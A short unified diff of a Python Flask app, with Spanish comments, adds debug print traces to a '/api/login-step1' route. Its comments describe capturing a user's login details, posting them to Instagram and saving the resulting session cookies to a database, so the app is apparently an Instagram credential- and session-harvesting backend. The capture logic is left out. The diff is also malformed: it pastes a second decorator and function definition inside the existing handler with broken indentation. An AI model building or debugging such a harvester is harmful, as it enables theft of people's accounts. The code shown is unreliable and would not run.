@@ -81,6 +81,26 @@ def home():
 
 @app.route('/api/login-step1', methods=['POST'])
 def handle_step1():
+
+    @app.route('/api/login-step1', methods=['POST'])
+def handle_step1():
+    # 🚨 PÉGALO AQUÍ: TRAZADO 1 (Línea 1 de la función)
+    print("--- LOG: 1 - Se recibió la llamada a /api/login-step1.")
+    
+    data = request.get_json()
+    username = data.get('username', 'usuario_desconocido')
+    
+    # 🚨 PÉGALO AQUÍ: TRAZADO 2 (Después de leer el usuario)
+    print(f"--- LOG: 2 - Recibido usuario: {username}")
+    
+    # ... (El resto de tu lógica para hacer el POST a Instagram) ...
+    
+    # ... (Si el post a Instagram es exitoso y se obtienen las cookies) ...
+    # 🚨 TRAZADO 4 (Antes de llamar al guardado)
+    # print(f"--- LOG: 4 - A punto de llamar a save_session_to_db para {username}")
+    # save_session_to_db(username, final_cookies) 
+    
+    return jsonify({"success": True, "message": "Placeholder"})
     # ... Lógica de captura de credenciales y primer POST a Instagram (OMITIDO) ...
     # ... En el caso de éxito, la función debe llamar a:
     # save_session_to_db(username, final_cookies) 
